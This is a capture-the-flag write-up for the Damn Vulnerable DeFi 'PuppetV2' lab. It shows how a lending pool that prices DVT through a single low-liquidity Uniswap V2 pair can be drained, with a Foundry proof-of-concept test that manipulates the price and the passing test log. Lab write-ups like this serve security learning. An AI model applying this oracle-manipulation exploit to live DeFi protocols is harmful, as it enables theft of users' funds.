# Damn Vulnerable Defi - PuppetV2
- Scope
    - PuppetV2Pool.sol
    - UniswapV2Library.sol
    - IUniswapV2Pair.sol
    - IUniswapV2Router02.sol
    - IUniswapV2Factory.sol
- Tools
    - [Foundry](https://github.com/foundry-rs/foundry)

# Findings

## `UniswapV2Exchange` single price oracle dependency allows for token price manipulation

### Summary
The PuppetPoolV2 rely on a single price oracle UniswapV2Exchange which has low liquidity, allowing manipulation of the value of DVT token and allow draining the token from PuppetPool.

### Vulnerability Details
Single reliance on UniswapV2Exchange as price oracle and low liquidity exchange. Allowing manipulation of a single token value.

### Impact/Proof of Concept
```
function test_puppetV2() public checkSolvedByPlayer {
        // Swap DVT for ETH in Uniswap, then deposit the ETH to WETH
        // DVT value drops, we use WETH to swap out all the DVT inside PuppetPool
        console.log("player DVT beforeBalance: ", token.balanceOf(address(player)) / 1e18);
        console.log("exchange DVT beforeBalance: ", token.balanceOf(address(uniswapV2Exchange)) / 1e18);
        
        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);
        token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(PLAYER_INITIAL_TOKEN_BALANCE, 0, path, address(player), 9999999999);
        console.log("player DVT afterBalance: ", token.balanceOf(address(player)) / 1e18);
        console.log("exchange DVT afterBalance: ", token.balanceOf(address(uniswapV2Exchange)) / 1e18);

        // Check what is the required WETH to get all the DVT out
        uint256 wethRequired = lendingPool.calculateDepositOfWETHRequired(token.balanceOf(address(lendingPool)));
        console.log("WETH required: ", wethRequired / 1e18);
        weth.deposit{value: address(player).balance}();
        console.log("player WETH Balance: ", weth.balanceOf(address(player)) / 1e18);
        weth.approve(address(lendingPool), wethRequired);
        // Borrow all the token from pool
        lendingPool.borrow(token.balanceOf(address(lendingPool)));
        
        // Transfer all the tokens to recovery
        token.transfer(recovery, token.balanceOf(player));
        console.log("pool DVT Balance: ", token.balanceOf(address(lendingPool)) / 1e18);
        console.log("player DVT Balance: ", token.balanceOf(address(player)) / 1e18);
        console.log("recovery DVT Balance: ", token.balanceOf(address(recovery)) / 1e18);
    }
```

Results
```diff
[PASS] test_puppetV2() (gas: 268432)
Logs:
  ===== BEFORE SWAP =====
  player DVT beforeBalance:  10000
  exchange DVT beforeBalance:  100
  ===== AFTER SWAP =====
  player DVT afterBalance:  0
  exchange DVT afterBalance:  10100
  ===== BEFORE BORROW =====
  WETH required:  29
  player WETH Balance:  29
  ===== AFTER BORROW =====
  pool DVT Balance:  0
  player DVT Balance:  0
  recovery DVT Balance:  1000000

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 9.12ms (1.92ms CPU time)
```

